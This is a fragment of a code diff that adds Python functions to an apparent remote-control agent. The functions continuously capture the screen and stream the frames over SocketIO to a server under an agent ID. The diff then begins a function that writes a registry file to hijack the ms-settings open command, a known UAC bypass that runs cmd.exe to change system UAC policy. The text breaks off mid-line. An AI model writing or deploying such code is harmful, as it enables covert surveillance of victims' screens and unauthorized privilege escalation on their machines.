+    global STREAMING_ENABLED, encode_queue, sio
+    while STREAMING_ENABLED:
+        try:
+            frame = encode_queue.get(timeout=0.5)
+        except queue.Empty:
+            continue
+        try:
+            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame}, binary=True)
+        except Exception as e:
+            log_message(f"SocketIO send error: {e}", "error")
+
+
+def start_streaming(agent_id):
+    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
+    if not STREAMING_ENABLED:
+        STREAMING_ENABLED = True
+        capture_queue = queue.Queue(maxsize=CAPTURE_QUEUE_SIZE)
+        encode_queue = queue.Queue(maxsize=ENCODE_QUEUE_SIZE)
+        STREAM_THREADS = [
+            threading.Thread(target=screen_capture_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=screen_encode_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=screen_send_worker, args=(agent_id,), daemon=True),
+        ]
+        for t in STREAM_THREADS:
+            t.start()
+        log_message(f"Started modern non-blocking video stream at {TARGET_FPS} FPS.")
+
+def stop_streaming():
+    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
+    if STREAMING_ENABLED:
+        STREAMING_ENABLED = False
+        for t in STREAM_THREADS:
+            t.join(timeout=2)
+        STREAM_THREADS = []
+        capture_queue = None
+        encode_queue = None
+        log_message("Stopped video stream.")
+
+# Documented: Modern streaming pipeline uses three threads and two queues for capture, encode, and send. Each stage is non-blocking and drops oldest frames if overloaded. FPS and buffer sizes are configurable.
+
+import os
+import subprocess
+import time
+
+def write_and_import_uac_bypass_reg():
+    reg_content = r'''
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]
+@="cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v
